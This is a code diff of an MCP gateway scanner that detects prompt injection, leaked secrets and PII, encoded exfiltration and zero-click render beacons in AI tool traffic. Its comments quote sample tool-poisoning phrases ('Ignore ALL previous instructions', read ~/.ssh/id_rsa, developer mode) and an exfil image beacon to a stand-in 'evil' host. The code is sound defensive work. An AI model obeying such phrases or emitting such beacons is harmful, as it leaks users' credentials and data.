@@ -11,15 +11,25 @@ See :func:`_enforce_blocks`.
 
 from __future__ import annotations
 
+import asyncio
 import logging
+import os
 from dataclasses import dataclass, field
 from typing import Any
 
 from ai_mesh_shared.mcp_compliance_tags import tags_for_preset_or_entity
 
-from mcp_scan_targets import extract_and_bind
-from patterns import detect_pii, detect_secrets, get_compliance_tags, redact_all
-from policy_engine import apply_redaction, evaluate_mcp_policies
+from mcp_scan_targets import _safe_json, extract_and_bind
+from patterns import (
+    _INFRA_NETWORK_KEYS,
+    detect_credential_exposure,
+    detect_ip_leakage,
+    detect_pii,
+    detect_secrets,
+    get_compliance_tags,
+    redact_all,
+)
+from policy_engine import apply_field_redaction, apply_redaction, evaluate_mcp_policies
 
 LOG = logging.getLogger("gateway.mcp_scan")
 
@@ -43,6 +53,11 @@ class McpFinding:
     tier: str = "tier1"
     threat_type: str = ""
     detail: str = ""
+    # CHG-0074: the concrete detector keys that matched (e.g. ["internal_ipv6",
+    # "file_path_unix"]). Lets a downstream enforcement floor tell an
+    # ENFORCEABLE network-infra leak (redactable) from a flag-tier file path
+    # WITHOUT re-parsing ``detail`` — see mcp_proxy._findings_have_infra_network_leak.
+    matched_kinds: list[str] = field(default_factory=list)
 
     def to_finding_dict(self) -> dict[str, Any]:
         return {
@@ -54,6 +69,7 @@ class McpFinding:
             "tier": self.tier,
             "threat_type": self.threat_type,
             "detail": self.detail,
+            "matched_kinds": list(self.matched_kinds),
         }
 
 
@@ -68,6 +84,15 @@ class McpScanResult:
     # when nothing blocked or redacted.
     monitored: bool = False
     scan_trace: list[dict[str, Any]] = field(default_factory=list)
+    # 3b: named response fields masked on the OUTPUT via per-policy RBAC field
+    # redaction (redaction_fields). Empty unless a matched policy declared fields
+    # AND the posture allowed mutation (not 'monitor'). Surfaced to the audit meta.
+    redacted_fields: list[str] = field(default_factory=list)
+    # 3b cross-stage: the field names DECLARED by policies matched in THIS scan
+    # (both directions), independent of whether they were applied. The INPUT scan
+    # surfaces these so the caller can project the same fields out of the RESPONSE
+    # (control HTTP-path parity: an input-stage policy match strips output fields).
+    policy_redaction_fields: list[str] = field(default_factory=list)
 
     @property
     def has_findings(self) -> bool:
@@ -75,21 +100,64 @@ class McpScanResult:
 
 
 def _get_input_scanner():
+    """Return the live InputScanner from the running gateway app module.
+
+    SAME defect class as ``_get_policy_sync`` (below): gunicorn loads
+    ``ai_mesh_gateway.main:app`` and its startup handler sets ``INPUT_SCANNER`` on
+    THAT module object; a bare ``import main`` can resolve to a *different* module
+    object (same file, separate namespace) whose module-level ``INPUT_SCANNER`` stayed
+    ``None`` — which silently disabled MCP **Tier-2** (``scan_prompt_with_tier2`` was
+    never reached; the tier2 scan fell back to ``scanner_unavailable`` even when the
+    operator enabled Tier-2). Resolve from ``sys.modules`` preferring the packaged
+    module, mirroring ``_get_policy_sync``.
+    """
+    import sys
+
+    for mod_name in ("ai_mesh_gateway.main", "main"):
+        mod = sys.modules.get(mod_name)
+        if mod is not None:
+            scanner = getattr(mod, "INPUT_SCANNER", None)
+            if scanner is not None:
+                return scanner
     try:
-        import main as gateway_main
+        import ai_mesh_gateway.main as gateway_main
 
         return getattr(gateway_main, "INPUT_SCANNER", None)
     except Exception:
-        return None
+        try:
+            import main as gateway_main  # noqa: WPS433 — legacy dev entry
+
+            return getattr(gateway_main, "INPUT_SCANNER", None)
+        except Exception:
+            return None
 
 
 def _get_policy_sync():
+    """Return the live PolicySync singleton from the running gateway app module.
+
+    Gunicorn loads ``ai_mesh_gateway.main:app``; a bare ``import main`` can resolve
+    to a *different* module object (same file, separate namespace) whose
+    ``POLICY_SYNC`` was never started — which silently disabled MCP policy eval.
+    """
+    import sys
+
+    for mod_name in ("ai_mesh_gateway.main", "main"):
+        mod = sys.modules.get(mod_name)
+        if mod is not None:
+            sync = getattr(mod, "POLICY_SYNC", None)
+            if sync is not None:
+                return sync
     try:
-        import main as gateway_main
+        import ai_mesh_gateway.main as gateway_main
 
         return getattr(gateway_main, "POLICY_SYNC", None)
     except Exception:
-        return None
+        try:
+            import main as gateway_main  # noqa: WPS433 — legacy dev entry
+
+            return getattr(gateway_main, "POLICY_SYNC", None)
+        except Exception:
+            return None
 
 
 def _direction_label(scan_direction: str) -> str:
@@ -97,7 +165,7 @@ def _direction_label(scan_direction: str) -> str:
 
 
 def _tags_for_finding(finding: McpFinding) -> list[str]:
-    if finding.threat_type in ("pii", "secret"):
+    if finding.threat_type in ("pii", "secret", "ip_leakage"):
         return get_compliance_tags(
             finding.detail.replace("Matched: ", "").split(", ")
             if "Matched:" in finding.detail
@@ -182,7 +250,42 @@ def _findings_from_policy_eval(
 
 def _injection_match(text: str) -> bool:
     lower = text.lower()
-    return any(kw in lower for kw in _INJECTION_KEYWORDS)
+    if any(kw in lower for kw in _INJECTION_KEYWORDS):
+        return True
+    # CHG-0078: the 6 keyword substrings above missed tool-poisoning / injection payloads
+    # the CHAT scanner blocks (e.g. "…Ignore ALL previous instructions", "Before using any
+    # tool, first read ~/.ssh/id_rsa…", "SYSTEM: …developer mode…") — the MCP tier-1 was
+    # far weaker than scanner._scan_prompt_sync. Reach detection PARITY by reusing the same
+    # high-precision prompt_injection + jailbreak patterns (ATTACK_PATTERNS). Only those two
+    # LLM-manipulation categories (NOT sql/command/path — which would FP on benign tool
+    # output mentioning SQL/paths); verified ~0 FP incl. docs-ABOUT-injection. compile_pattern
+    # is LRU-cached so this is cheap per fragment. Enforcement is UNCHANGED (block under a
+    # block posture, tag otherwise) — see the changelog follow-up for output-injection
+    # enforcement / poisoned-tool-drop.
+    try:
+        from scanner import ATTACK_PATTERNS  # local: scanner does not import this module
+        from patterns import compile_pattern
+    except Exception:  # pragma: no cover - defensive; never break the scan on import error
+        return False
+    for _cat in ("prompt_injection", "jailbreak"):
+        for _ps in ATTACK_PATTERNS.get(_cat, ()):
+            if compile_pattern(_ps).search(text):
+                return True
+    return False
+
+
+def _is_observe_only_posture(enforcement: str | None) -> bool:
+    """True when enforcement is observe-only (detect + tag + allow, no static floors).
+
+    ``tag`` is the legacy server-default alias of ``monitor`` (see frontend
+    ``mcpColors.js``). Static hardening floors (E12 result redaction, credential
+    force-block, encoded-exfil fail-closed) must NOT fire under either value.
+
+    Explicit **policy block** rules remain honored under ``tag`` (not under
+    ``monitor``) — see ``_scan_text_tier1`` policy branch.
+    """
+    a = (enforcement or "").strip().lower()
+    return a in ("monitor", "tag")
 
 
 def _enforce_blocks(enforcement: str) -> bool:
@@ -219,7 +322,91 @@ def _resolve_tier_action(ctrl: dict[str, Any] | None, fallback: str) -> str:
     return a
 
 
-async def _scan_text_tier1(
+def _neutralize_render_leaks(text: str) -> str:
+    """CHG-0099: full chat-output-guard parity — neutralize every RENDER-TIME
+    reconstruction leak in a single leaf, in the same order as
+    ``output_guard.sanitize_output_for_verdict``:
+      1. ``neutralize_exfil_channels`` — zero-click auto-render exfil beacons (runs FIRST
+         so it sees the raw URL, before any masking hides the payload);
+      2. ``neutralize_encoded_pii`` — HTML-entity / percent-encoded runs that DECODE to a
+         PII/secret;
+      3. ``neutralize_markdown_split_pii`` — a PII/secret whose chars are interleaved with
+         inline markdown emphasis / code / HTML markers (``1**2**3-45-6789`` renders as an
+         SSN) — the CHG-0096 MCP gap (only #1 was wired, so a markdown-split PII/secret in
+         a tool RESULT evaded the raw regexes yet a markdown client reconstructed it).
+    Each is a STRICT no-op on benign markdown/URLs."""
+    from output_guard import (  # local: avoid import cycle
+        neutralize_encoded_pii,
+        neutralize_exfil_channels,
+        neutralize_markdown_split_pii,
+    )
+    return neutralize_markdown_split_pii(neutralize_encoded_pii(neutralize_exfil_channels(text)))
+
+
+# CHG-0114: cap the recursive walk depth in _neutralize_exfil_deep. CPython's
+# ``json.loads`` C scanner parses very deeply-nested JSON that the Python-level walk
+# below then cannot traverse (default recursion limit ~1000) — so an untrusted MCP
+# result nested a few thousand deep RAISED RecursionError, which tier1 swallowed,
+# SILENTLY SKIPPING render-leak neutralization for that result (a fail-open DoS on the
+# exfil defense). Legit MCP result nesting is shallow; 200 is far beyond any real
+# payload and well under the stack limit. Overridable for pathological legit servers.
+_MAX_EXFIL_WALK_DEPTH = int(os.environ.get("MCP_EXFIL_WALK_MAX_DEPTH", "200"))
+
+
+def _neutralize_exfil_deep(text: str) -> str:
+    """CHG-0097/0099: render-leak neutralization that is robust to JSON serialization.
+
+    The MCP tier-1 scan target is usually the WHOLE result payload JSON-serialized
+    (``target_mode="entire"``), so HTML attribute quotes are escaped (``src=\\"...\\"``)
+    and the HTML/srcset regexes (which expect real quotes) miss them — the CHG-0096
+    residual. If ``text`` is a JSON structure, parse it and neutralize each UNESCAPED
+    string leaf (via ``_neutralize_render_leaks`` — exfil beacons + encoded-PII +
+    markdown-split PII, CHG-0099), then re-serialize — so HTML/SVG/CSS beacons AND
+    markdown-split PII nested in a field are handled too. Non-JSON text (a plain-string
+    result) is neutralized directly. Returns the ORIGINAL text unchanged when nothing was
+    neutralized (no reformatting churn, so a benign result stays byte-identical).
+
+    CHG-0114: the per-leaf walk is DEPTH-BOUNDED and the walk + re-serialize are
+    fail-safe (RecursionError / any error → string-level neutralize), so a deeply-nested
+    untrusted result cannot exhaust the Python stack and cannot silently disable the
+    render-leak defense."""
+    stripped = text.lstrip()
+    if stripped[:1] not in ("{", "["):
+        return _neutralize_render_leaks(text)
+    import json as _json
+    try:
+        obj = _json.loads(text)
+    except Exception:
+        return _neutralize_render_leaks(text)
+    changed = [False]
+
+    def _walk(o, _depth=0):
+        # CHG-0114: cap recursion — beyond the depth an adversarial payload cannot
+        # exhaust the stack; a render-time beacon nested this deep cannot reconstruct
+        # client-side anyway, and the whole serialized text is still tier1-scanned.
+        if _depth >= _MAX_EXFIL_WALK_DEPTH:
+            return o
+        if isinstance(o, str):
+            n = _neutralize_render_leaks(o)
+            if n != o:
+                changed[0] = True
+            return n
+        if isinstance(o, list):
+            return [_walk(x, _depth + 1) for x in o]
+        if isinstance(o, dict):
+            return {k: _walk(v, _depth + 1) for k, v in o.items()}
+        return o
+
+    try:
+        obj = _walk(obj)
+        return _json.dumps(obj) if changed[0] else text
+    except Exception:
+        # Never raise into the scan: a very deep (past-cap) obj can still trip
+        # json.dumps recursion — fall back to string-level neutralization.
+        return _neutralize_render_leaks(text)
+
+
+def _scan_text_tier1_sync(
     text: str,
     *,
     scan_direction: str,
@@ -229,10 +416,16 @@ async def _scan_text_tier1(
     server_slug: str,
     tool_name: str,
     actor: dict[str, Any] | None = None,
-) -> tuple[str, list[McpFinding], bool]:
-    """Run Tier-1 policy + preset evaluation on a single text fragment."""
+) -> tuple[str, list[McpFinding], bool, list[str]]:
+    """Run Tier-1 policy + preset evaluation on a single text fragment.
+
+    Returns ``(mutated_text, findings, blocked, redaction_fields)`` where
+    ``redaction_fields`` (3b) are the named response fields the matched policy
+    declared for RBAC masking — surfaced so ``scan_mcp_payload`` can mask them on
+    the structured OUTPUT payload (the injection/PII fallbacks declare none).
+    """
     if not text:
-        return text, [], False
+        return text, [], False, []
 
     findings: list[McpFinding] = []
     blocked = False
@@ -257,15 +450,47 @@ async def _scan_text_tier1(
                 _findings_from_policy_eval(eval_result, scan_direction=scan_direction, text=text)
             )
             policy_redacts = eval_result.action == "redact"
-            if _enforce_blocks(enforcement):
-                # A4 FIX: block posture blocks on ANY matched policy rule, even
-                # one authored as redact/tag. Floor, not ceiling.
+            # A matched rule authored action='block' is an EXPLICIT block intent —
+            # honor it even under a coarser posture (tag/redact), matching the
+            # control-plane engine (engine.py blocks on ``result.action == "block"``)
+            # and the backend HTTP path. Without this, the stdio/websocket adapter
+            # path — which bypasses the backend that would re-enforce the rule —
+            # silently downgrades an actor-scoped block rule to detect-and-tag
+            # under the default 'tag' posture (BACKSTOP_FINDINGS G2 item 3, #3).
+            # A 'monitor' posture is an explicit observe-only override and wins.
+            policy_blocks = eval_result.action == "block"
+            if _enforce_blocks(enforcement) or (
+                policy_blocks and not (enforcement or "").strip().lower() == "monitor"
+            ):
+                # A4 FIX: block posture is a FLOOR (blocks ANY matched rule, even
+                # one authored redact/tag); additionally a rule's own 'block'
+                # action is honored under any non-monitor posture (CHG-0007), including
+                # legacy ``tag``.
                 blocked = True
-            elif enforcement == "redact" and (policy_redacts or eval_result.redaction_hints):
+            elif policy_redacts and eval_result.redaction_hints and (
+                (enforcement or "").strip().lower() != "monitor"
+            ):
+                # Policy-authored redact rules apply whenever they match — not only
+                # when the server/tool posture is explicitly ``redact``. Skipped under
+                # an explicit per-tier ``monitor`` posture (control-plane parity:
+                # MCPToolCallView skips input redaction when _input_action == monitor).
                 mutated = apply_redaction(text, eval_result.redaction_hints)
-            return mutated, findings, blocked
+            return mutated, findings, blocked, list(eval_result.redaction_fields)
 
-    if _injection_match(text):
+    # CHG-0079: deobfuscate INVISIBLE / CONFUSABLE unicode (zero-width, bidi-override,
+    # homoglyph, unicode-tag block, combining-mark smuggling) before detection. The chat
+    # scanner normalizes via _normalize_unicode before scanning, but the MCP tier-1
+    # scanned RAW text — so a zero-width-broken ("I​g​n​o​r​e…") or homoglyph ("Ｉgnore…")
+    # injection, or a similarly hidden secret / internal-IP (below), bypassed it. Only
+    # NON-ASCII text can carry these characters, so pure-ASCII text (the common case)
+    # skips the normalize cost entirely.
+    if not text.isascii():
+        from scanner import _normalize_unicode  # local: scanner doesn't import this module
+        _deob = _normalize_unicode(text)
+    else:
+        _deob = text
+
+    if _injection_match(text) or (_deob != text and _injection_match(_deob)):
         findings.append(
             McpFinding(
                 entity_type="prompt_injection",
@@ -282,12 +507,38 @@ async def _scan_text_tier1(
             blocked = True
         elif enforcement == "redact":
             mutated = redact_all(text)
-        return mutated, findings, blocked
+        return mutated, findings, blocked, []
 
     pii = detect_pii(text)
     secrets = detect_secrets(text)
-    if pii or secrets:
-        kinds = list(pii.keys()) + list(secrets.keys())
+    # 1.4 "PII/IP/regulated": extend MCP tagging to IP/infrastructure leakage
+    # (internal IPs, internal hostnames, internal URLs, private file paths). These
+    # patterns + detect_ip_leakage already existed and ran on the chat output_guard
+    # path, but the MCP tool-call scan only ran detect_pii/detect_secrets — so an
+    # internal host/path in a tool RESULT was never detected/tagged/redacted.
+    ip_leak = detect_ip_leakage(text)
+    # CHG-0075: also run detect_credential_exposure. CREDENTIAL_EXPOSURE_PATTERNS is a
+    # SEPARATE dict (bearer_token, connection_string w/ password, jwt, stripe_key,
+    # twilio_api_key, azure_storage_key, gcp_service_account_key, slack_token,
+    # github_fine_grained_pat) NOT read by detect_secrets. redact_all masks it, but the
+    # MCP tier-1 scan only ran detect_pii/secrets/ip_leak — so a credential whose ONLY
+    # match is a CREDENTIAL_EXPOSURE kind (e.g. a Stripe/Twilio/Azure key or a DB
+    # connection string's password) was never DETECTED, so it drove no enforcement and
+    # egressed RAW on a tool RESULT (and passed unblocked in tool ARGS to an untrusted
+    # upstream). Same wrong-dict class as CHG-0071. Folded into the secret bucket.
+    cred_exp = detect_credential_exposure(text)
+    if pii or secrets or ip_leak or cred_exp:
+        kinds = (
+            list(pii.keys()) + list(secrets.keys())
+            + list(ip_leak.keys()) + list(cred_exp.keys())
+        )
+        # threat precedence: pii > secret/credential > ip_leakage (a credential
+        # exposure is a "secret" for _findings_have_secret_or_pii / _findings_have_
+        # credential, so it drives the redact floor AND the arg credential force-block).
+        threat = (
+            "pii" if pii
+            else ("secret" if (secrets or cred_exp) else "ip_leakage")
+        )
         findings.append(
             McpFinding(
                 entity_type=kinds[0] if kinds else "PII",
@@ -296,15 +547,186 @@ async def _scan_text_tier1(
                 end=len(text),
                 direction=mcp_dir,
                 tier="tier1",
-                threat_type="pii" if pii else "secret",
+                threat_type=threat,
                 detail=f"Matched: {', '.join(kinds)}",
+                matched_kinds=kinds,  # CHG-0074: enables the network-infra redact floor
             )
         )
         if _enforce_blocks(enforcement):
             blocked = True
         elif enforcement == "redact":
-            mutated = redact_all(text)
-    return mutated, findings, blocked
+            candidate = redact_all(text)
+            # Egress-byte truth / fail-closed: if ANY detected PII/secret/internal
+            # value survives the scrub VERBATIM, do NOT forward a "redacted" result
+            # that still carries it — block instead (a redact-that-leaks is the
+            # A4-class defect). redact_all masks internal IP/host/URL but NOT private
+            # file paths, and a masker bug could leave a detected value un-scrubbed
+            # (cf. CHG-0054 private-key body). CHG-0057: byte-verify ALL detected
+            # categories, not just ip_leak — the "PII/secret always covered" assumption
+            # is now enforced, not assumed. Standard partial-masked PII (email/ssn/card,
+            # whose raw form is always altered) is never a substring of the scrub, so
+            # this does NOT false-block (verified over the full PII/secret battery).
+            _detected_values = (
+                list(pii.values()) + list(secrets.values())
+                + list(ip_leak.values()) + list(cred_exp.values())  # CHG-0075
+            )
+            if any(v and str(v) in candidate for v in _detected_values):
+                blocked = True
+            else:
+                mutated = candidate
+
+    # CHG-0076: obfuscation-bypass parity with the chat output scanner (G33/G35).
+    # detect_secrets folds base64/hex transport, but a SECRET / CREDENTIAL / INTERNAL
+    # NETWORK IP hidden by a TEXT-encoding (HTML char refs &#..;, percent-encoding,
+    # \u / \x escapes) dodges the raw regexes above — yet a markdown/HTML MCP client
+    # decodes it back to the value, so a malicious upstream can exfil a stolen
+    # credential / internal IP past the firewall (or a tenant can smuggle one in ARGS).
+    # redact_all CANNOT mask an ENCODED run, so BLOCK (fail-closed) — mirroring the chat
+    # INPUT path (scanner._scan_prompt_sync) and the byte-verify block above; a 'monitor'
+    # posture stays observe-only. SCOPED to secret/credential/internal-NETWORK-IP (no
+    # legit reason to text-encode those); generic PII is EXCLUDED so a scraped HTML page's
+    # entity-encoded contact email does not false-block a legitimate web/HTML tool result.
+    if not blocked and not _is_observe_only_posture(enforcement):
+        from scanner import _decode_text_encoding_variants  # local: avoid import cycle
+        _variants = list(_decode_text_encoding_variants(text))
+        # CHG-0079: also probe the INVISIBLE/CONFUSABLE-unicode-deobfuscated view
+        # (zero-width / bidi / homoglyph / unicode-tag smuggling) — a secret / internal
+        # IP hidden that way dodges the raw regexes but the model reads it deobfuscated.
+        if _deob != text:
+            _variants.append(_deob)
+        # PIPELINE-0011: collect kinds detectable in the TRULY RAW text (no
+        # canonicalization) so the encoded-exfil check only fires on kinds
+        # genuinely REVEALED by decoding/deobfuscation, not plain-text kinds.
+        # ALL four detect_* functions internally canonicalize (strip ZWC, fold
+        # fullwidth), so a ZWC-hidden credential appears in the detect_* result
+        # even though it's really obfuscated — use the _*_core variants (no
+        # canon) for the filter.
+        from patterns import (  # local: no cycle
+            _detect_pii_core, _detect_secrets_core,
+            _detect_ip_leakage_core, _detect_credential_exposure_core,
+        )
+        _raw_detected_kinds: set[str] = set()
+        _raw_detected_kinds.update(_detect_pii_core(text).keys())
+        _raw_detected_kinds.update(_detect_secrets_core(text).keys())
+        _raw_detected_kinds.update(_detect_ip_leakage_core(text).keys())
+        _raw_detected_kinds.update(_detect_credential_exposure_core(text).keys())
+        for _variant in _variants:
+            if _variant == text:
+                continue
+            _hidden: dict[str, str] = {}
+            _hidden.update(detect_secrets(_variant))
+            _hidden.update(detect_credential_exposure(_variant))
+            _hidden.update({
+                k: v for k, v in detect_ip_leakage(_variant).items()
+                if k in _INFRA_NETWORK_KEYS
+            })
+            # CHG-0083: several CREDENTIALS live in PII_PATTERNS (detect_pii), not
+            # SECRET_PATTERNS — aws_access_key (AKIA/ASIA), aws_secret_access_key,
+            # api_key_openai, github_token, private_key_header. detect_secrets misses
+            # them, so an OBFUSCATED AWS key (HTML-entity / zero-width / homoglyph) slipped
+            # past the encoded-exfil block above while its raw form masks. Include decoded
+            # detect_pii matches whose compliance tag is SECRET (credentials misfiled as
+            # PII) — NOT generic PII (email/phone/ssn/cc: tags GDPR/PII/HIPAA/PCI-DSS, never
+            # SECRET), which stays excluded to avoid FP on entity-encoded scraped-HTML PII.
+            _hidden.update({
+                k: v for k, v in detect_pii(_variant).items()
+                if "SECRET" in get_compliance_tags([k])
+            })
+            # PIPELINE-0011: filter out kinds already detected in plain text.
+            _hidden = {k: v for k, v in _hidden.items()
+                       if k not in _raw_detected_kinds}
+            if _hidden:
+                findings.append(
+                    McpFinding(
+                        entity_type=next(iter(_hidden)),
+                        score=0.9,
+                        start=0,
+                        end=len(text),
+                        direction=mcp_dir,
+                        tier="tier1",
+                        threat_type="secret",
+                        detail=f"Encoded exfil (text-encoding) hides: {', '.join(_hidden)}",
+                        matched_kinds=list(_hidden),
+                    )
+                )
+                blocked = True
+                break
+
+    # CHG-0096: defang zero-click auto-render EXFIL BEACONS in the tool RESULT — parity
+    # with the chat output guard (G40-G43). A malicious upstream tool result can embed a
+    # markdown-image ``![x](https://evil/?d=<data>)``, an HTML ``<img src=...>`` / srcset,
+    # or a protocol-relative beacon that a markdown/HTML MCP client AUTO-FETCHES on render
+    # — a zero-click exfil of arbitrary data the text regexes never recognise as a secret
+    # (so nothing above detected/masked it, yet the raw beacon egressed). This egress
+    # BYPASSES the chat output guard (a distinct API surface). ``neutralize_exfil_channels``
+    # masks the smuggled payload + strips the auto-render (image -> plain link); it is a
+    # STRICT no-op on benign markdown/URLs (gated by ``_url_smuggles_data``), so it is safe
+    # to run unconditionally under any enforcing posture. Applied to ``mutated`` so it
+    # composes on top of any PII/secret redaction above; a 'monitor' posture stays
+    # observe-only (matches the encoded-exfil block's gate).
+    if not blocked and not _is_observe_only_posture(enforcement):
+        # Run on the RAW text (not the already-redacted ``mutated``): the beacon's
+        # smuggled payload must be VISIBLE for ``_url_smuggles_data`` to trip — if
+        # redact_all masked the URL's PII first, the neutralizer would see a masked tail
+        # and leave the auto-render intact. If a beacon is defanged, RE-APPLY the
+        # PII/secret redaction over the defanged text (when any was detected) so both the
+        # beacon AND any other sensitive value are masked. CHG-0097: ``_neutralize_exfil_deep``
+        # is JSON-aware so HTML/SVG/CSS/srcset beacons nested in a JSON payload (whose
+        # attribute quotes are escaped) are defanged too, not just markdown/bare-URL.
+        _neu = _neutralize_exfil_deep(text)
+        if _neu != text:
+            findings.append(
+                McpFinding(
+                    entity_type="render_reconstruction",
+                    score=0.9,
+                    start=0,
+                    end=len(text),
+                    direction=mcp_dir,
+                    tier="tier1",
+                    threat_type="exfil",
+                    detail=(
+                        "Neutralized a render-time reconstruction leak (zero-click exfil "
+                        "beacon / encoded-PII / markdown-split PII-secret)"
+                    ),
+                )
+            )
+            mutated = redact_all(_neu) if (pii or secrets or ip_leak or cred_exp) else _neu
+    return mutated, findings, blocked, []
+
+
+# CHG-0103: the Tier-1 scan (detect_* + redact_all + the render-leak neutralizers, all
+# SYNCHRONOUS regex over the text) ran inline on the event loop. A LARGE tool result
+# (up to the 10MB response cap) took seconds of pure CPU and BLOCKED the loop — freezing
+# EVERY other concurrent request on that worker (measured: an 8MB scan stalled a trivial
+# coroutine ~9.8s). Offload the scan to a worker thread for large inputs so the loop stays
+# responsive (the ``re`` loop releases the GIL between patterns; the same 8MB scan then
+# stalls the loop only ~0.16s). Small results (the common case) run INLINE — the scan is
+# sub-millisecond and offloading would only add thread-pool pressure under peak load.
+_TIER1_OFFLOAD_THRESHOLD = int(os.environ.get("MCP_TIER1_OFFLOAD_BYTES", str(64 * 1024)))
+
+
+async def _scan_text_tier1(
+    text: str,
+    *,
+    scan_direction: str,
+    enforcement: str,
+    full_payload: Any,
+    org_slug: str,
+    server_slug: str,
+    tool_name: str,
+    actor: dict[str, Any] | None = None,
+) -> tuple[str, list[McpFinding], bool, list[str]]:
+    """Async entrypoint for the CPU-bound Tier-1 scan. Offloads a LARGE input to a worker
+    thread (CHG-0103) so the synchronous regex scan never blocks the event loop under load;
+    a small input runs inline to avoid thread-pool pressure. Same signature/return as the
+    prior async function, so callers + tests are unchanged."""
+    _kwargs = dict(
+        scan_direction=scan_direction, enforcement=enforcement, full_payload=full_payload,
+        org_slug=org_slug, server_slug=server_slug, tool_name=tool_name, actor=actor,
+    )
+    if len(text) > _TIER1_OFFLOAD_THRESHOLD:
+        return await asyncio.to_thread(_scan_text_tier1_sync, text, **_kwargs)
+    return _scan_text_tier1_sync(text, **_kwargs)
 
 
 async def _scan_text_tier2(
@@ -371,11 +793,19 @@ async def scan_mcp_payload(
     server_slug: str = "",
     tool_name: str = "",
     actor: dict[str, Any] | None = None,
+    extra_redaction_fields: list[str] | None = None,
 ) -> tuple[Any, McpScanResult]:
     """Run Tier-1 then conditional Tier-2 on ``payload`` for input or output.
 
     ``actor`` (M-04): optional {user_id, agent_id, roles} identity used to
     scope actor-allowlisted MCP policies during Tier-1 evaluation.
+
+    ``extra_redaction_fields`` (3b cross-stage): named fields to mask on the
+    OUTPUT in addition to any this scan's own policy matches declare. The caller
+    threads the INPUT scan's ``policy_redaction_fields`` here so an input-stage
+    policy match projects those fields out of the RESPONSE — control HTTP-path
+    parity for the RBAC "role X never sees field F" pattern (the rule fires on the
+    call, not the response). Ignored on the input direction.
     """
     result = McpScanResult()
     tier1_ctrl = _effective_control(effective_controls, "tier1", scan_direction)
@@ -384,6 +814,51 @@ async def scan_mcp_payload(
     # defers to the server/tool action passed as ``enforcement``.
     tier1_action = _resolve_tier_action(tier1_ctrl, enforcement)
     result_redacted = False
+    # 3b: accumulate the named response fields that matched actor-scoped policies
+    # declared for RBAC masking (deduped, order-preserving). Applied to the
+    # structured OUTPUT payload at each non-blocked return via _finalize_output —
+    # this closes the "adapter path does content-scan but no field-level RBAC
+    # masking" gap (BACKSTOP finding #1); the HTTP path already masks these fields.
+    field_redaction_union: list[str] = []
+
+    def _finalize_output(out_payload: Any) -> Any:
+        """Mask per-policy ``redaction_fields`` on the OUTPUT payload.
+
+        Parity with the control HTTP path (apply_field_redaction): applies ONLY
+        on the output direction, only when a matched policy declared fields (this
+        scan's own matches PLUS the caller-threaded ``extra_redaction_fields`` from
+        the input stage), and NOT under a 'monitor' posture (observe-only). A
+        'block' posture already withheld the payload upstream, so field masking
+        never runs on a blocked call. Records the masked field set + a scan-trace
+        stage for audit ONLY when a named field was actually present (identity
+        no-op otherwise — so a caller never mislabels an unchanged result).
+        """
+        if scan_direction != "output":
+            return out_payload
+        mask_fields = list(field_redaction_union)
+        for _rf in (extra_redaction_fields or []):
+            if isinstance(_rf, str) and _rf and _rf not in mask_fields:
+                mask_fields.append(_rf)
+        if not mask_fields:
+            return out_payload
+        # Pure observe-only ``monitor`` skips field RBAC; ``tag`` still honors
+        # policy-declared redaction_fields (cross-stage RBAC projection).
+        if (enforcement or "").strip().lower() == "monitor":
+            return out_payload
+        masked = apply_field_redaction(out_payload, mask_fields)
+        if masked is out_payload:
+            return out_payload  # none of the named fields present -> true no-op
+        result.redacted_fields = mask_fields
+        result.scan_trace.append(
+            {
+                "scan_stage": "field_redaction",
+                "tier": "tier1",
+                "direction": scan_direction,
+                "fields": list(mask_fields),
+                "policy_engine": True,
+            }
+        )
+        return masked
 
     if not tier1_ctrl.get("enabled", True):
         result.scan_trace.append(
@@ -410,7 +885,7 @@ async def scan_mcp_payload(
     for text, setter, path_label in targets:
         if not text:
             continue
-        new_text, findings, blocked = await _scan_text_tier1(
+        new_text, findings, blocked, rfields = await _scan_text_tier1(
             text,
             scan_direction=scan_direction,
             enforcement=tier1_action,
@@ -420,19 +895,47 @@ async def scan_mcp_payload(
             tool_name=tool_name,
             actor=actor,
         )
+        for _rf in rfields:
+            if _rf not in field_redaction_union:
+                field_redaction_union.append(_rf)
         result.findings.extend(findings)
         if findings:
             for f in findings:
                 result.compliance_tags = _merge_tags(
                     result.compliance_tags, _tags_for_finding(f)
                 )
-            if tier1_action == "monitor":
+            if _is_observe_only_posture(tier1_action):
                 result.monitored = True
         if blocked:
             tier1_blocked = True
-        if new_text != text and tier1_action == "redact":
+        _policy_driven_redact = any(f.threat_type == "redact" for f in findings)
+        if new_text != text and not blocked and (
+            tier1_action == "redact" or _policy_driven_redact
+        ):
+            # CHG-0047: fail-closed no-op-scrub guard (egress bytes are the only
+            # source of truth). Tier-1 produced a redaction (new_text != text);
+            # VERIFY the setter actually applied it by comparing the payload bytes
+            # before/after. A setter that silently no-ops (e.g. a best-effort
+            # mutator on an exotic nested path) would otherwise leave the RAW value
+            # in the payload while result_redacted claims a scrub — the CHG-0046
+            # class of leak. If the payload did not change, BLOCK rather than egress
+            # an un-scrubbed result. Complements CHG-0046 (which made the known
+            # non-string setters real) by catching ANY residual no-op scrub.
+            _before = _safe_json(state_ref[0])
             setter(new_text)
             result_redacted = True
+            if _safe_json(state_ref[0]) == _before:
+                tier1_blocked = True
+                result.scan_trace.append(
+                    {
+                        "scan_stage": "noop_scrub_failclosed",
+                        "tier": "tier1",
+                        "direction": scan_direction,
+                        "target_mode": target_mode,
+                        "key_path": path_label,
+                        "reason": "redaction_setter_noop_raw_survived",
+                    }
+                )
         result.scan_trace.append(
             {
                 "scan_stage": "tier1",
@@ -448,6 +951,11 @@ async def scan_mcp_payload(
             }
         )
 
+    # 3b cross-stage: surface the field names THIS scan's matched policies
+    # declared (both directions) so the caller can project them out of the paired
+    # RESPONSE. Set from the this-scan union only (NOT extra_redaction_fields).
+    result.policy_redaction_fields = list(field_redaction_union)
+
     if tier1_blocked:
         result.blocked = True
         return payload, result
@@ -455,14 +963,14 @@ async def scan_mcp_payload(
     mutable = state_ref[0]
 
     if not tier2_ctrl.get("enabled", False):
-        return (mutable if result_redacted else payload), result
+        return _finalize_output(mutable if result_redacted else payload), result
 
     org_override = _org_tier2_allowed(enabled_info)
     if org_override is False:
         result.scan_trace.append(
             {"scan_stage": "tier2_skipped", "tier": "tier2", "reason": "org_mcp_tier2_disabled"}
         )
-        return (mutable if result_redacted else payload), result
+        return _finalize_output(mutable if result_redacted else payload), result
 
     strict_mode = tier2_ctrl.get("strict_mode") or "strict"
     tier2_action = _resolve_tier_action(tier2_ctrl, enforcement)
@@ -487,7 +995,7 @@ async def scan_mcp_payload(
